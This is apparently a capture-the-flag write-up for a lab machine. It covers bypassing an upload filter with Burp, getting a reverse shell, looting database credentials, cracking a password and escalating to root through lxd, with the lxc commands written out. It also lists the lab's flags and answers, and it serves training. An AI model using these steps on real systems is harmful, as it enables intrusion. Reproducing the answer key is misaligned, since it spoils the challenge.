# Day 24 - Time for some ELForensics

Deploy the machine and as usual lets start by doing a nmap scan

Now use gobuster on webserver that is hosted on port 65000

Lets go to file upload.php and upload our reversehsell file.

But wait the filter is causing us a lot of headache right? Lets fire up burpsuite and now reload the uploads page such a was that burp intercepts even the js file.

Once it get intercepted drop the filter.js file and foreword the remaining requests.

Now upload your Reverse Shell file after the upload is done.

Got to grid and save click on your RevShell and once you click it.


You Netcat listner gets a shell.

Now lets got o /var/www folder to get the flag and for dbauth.php in TheGrid/include folder for username and password.


Now lets login with the credentials that we got, on mysql

`mysql -utron -p`

And type in the password we got.

Now lets enum the databases

`show databases;`
`use torn;`
`show tables;`
`select * from users;`

Now we have another user's username and passowrd crack the password using crackstation.

now lets to flynn 

`su flynn`

and use the crackedpassword.

for the flag go to /home/flynn/user.txt

now lets see what group is flynn in using `id`

So we are part of lxd.

Lets look for any containers using

`lxc image list`

gives us that there is a container named Alpine.

So now lets do our privilege escalation 

`lxc init alpine <CONTAINERNAME> -c security.privileged=true`

`lxc config device add <CONTAINERNAME> <DEVICENAME> disk source=/ path=/mnt/root recursive=true`

`lxc start CONTAINERNAME`

`lxc exec CONTAINERNAME /bin/sh`

Once you get a shell use the following cmmands as we have the privilege as a root

Now we have the privilege of root 

`id`
`cd /mnt/root/root`
`cat root.txt`

### Questions

...

	1. Scan the machine. What ports are open?
		- Ans: 80, 65000
	2. What's the title of the hidden website? It's worthwhile looking recursively at all websites on the box for this step.
		- Ans: Light Cycle
	3. What is the name of the hidden php page?
		- Ans: Uploads.php
	4. What is the name of the hidden directory where file uploads are saved?
		- Ans: grid
	5. Bypass the filters. Upload and execute a reverse shell. 
		- Ans: No answer needed
	6. What is the value of the web.txt flag?
		- Ans: THM{ENTER_THE_GRID}
	7. Upgrade and stabilize your shell.
		- Ans: No answer needed
	8.  the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? username:password
		- Ans: tron:IFightForTheUsers
	9. Access the database and discover the encrypted credentials. What is the name of the database you find these in?
		- Ans: tron
	10. Crack the password. What is it?
		- Ans: @computer@
	11. Use su to login to the newly discovered user by exploiting password reuse. 
		- Ans: No answer needed.
	12. What is the value of the user.txt flag?
		- Ans: THM{IDENTITY_DISC_RECOGNISED}
	13. Check the user's groups. Which group can be leveraged to escalate privileges? 
		- Ans: lxd
	14. Abuse this group to escalate privileges to root
		- Ans: No answer needed
	15. What is the value of the root.txt flag?
		- Ans: THM{FLYNN_LIVES}

...

Out of this challenge took sometime as I was new to lxc but thanks to THM's description it was easy.

Thank you <3